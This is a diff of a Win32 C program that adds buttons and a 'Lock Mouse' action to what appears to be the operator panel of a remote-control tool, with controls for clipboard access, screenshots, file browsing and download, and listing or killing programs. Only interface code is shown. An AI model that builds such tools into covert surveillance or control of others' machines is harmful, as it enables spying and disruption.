@@ -32,6 +32,10 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
                 GetWindowText(hedit, menuController.payload, 512);
                 menuController.action = SET_CLIPBOARD_ACTION;
             }
+            else if((LOWORD(wParam)) == LOCK_MOUSE_ID)
+            {
+                menuController.action = LOCK_MOUSE_ACTION;
+            }
 
             if (HIWORD(wParam) == CBN_SELCHANGE)
             {
@@ -77,17 +81,47 @@ void createWindow(HWND *hEditLog, HINSTANCE hInstance, int nCmdShow)
     CreateWindow("BUTTON", "Get Clipboard",
                  WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
                  10, 260, 100, 30,
-                 hwnd, (HMENU)1,
+                 hwnd, (HMENU)GET_CLIPBOARD_ID,
                  (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE), NULL);
     CreateWindow("BUTTON", "Set Clipboard",
                  WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
                  120, 260, 100, 30,
-                 hwnd, (HMENU)3,
+                 hwnd, (HMENU)SET_CLIPBOARD_ID,
+                 (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE), NULL);
+    CreateWindow("BUTTON", "Screenshot",
+                 WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
+                 10, 300, 100, 30,
+                 hwnd, (HMENU)GET_SCREENSHOT_ID,
+                 (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE), NULL);
+    menuController.lockButton = CreateWindow("BUTTON", "Lock Mouse",
+                 WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
+                 120, 300, 100, 30,
+                 hwnd, (HMENU)LOCK_MOUSE_ID,
+                 (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE), NULL);
+    CreateWindow("BUTTON", "Explore Files",
+                 WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
+                 10, 340, 100, 30,
+                 hwnd, (HMENU)EXPLORE_FILES_ID,
+                 (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE), NULL);
+    CreateWindow("BUTTON", "Download File",
+                 WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
+                 120, 340, 100, 30,
+                 hwnd, (HMENU)DOWNLOAD_FILE_ID,
+                 (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE), NULL);
+    CreateWindow("BUTTON", "Get Programs",
+                 WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
+                 10, 380, 100, 30,
+                 hwnd, (HMENU)GET_PROGRAMS_ID,
+                 (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE), NULL);
+    CreateWindow("BUTTON", "Kill Program",
+                 WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
+                 120, 380, 100, 30,
+                 hwnd, (HMENU)CLOSE_PROGRAM_ID,
                  (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE), NULL);
     CreateWindow("BUTTON", "Close",
                  WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
                  10, 420, 100, 30,
-                 hwnd, (HMENU)4,
+                 hwnd, (HMENU)CLOSE_ID,
                  (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE), NULL);
     hedit = CreateWindowEx(0, "EDIT", "",
                            WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL,
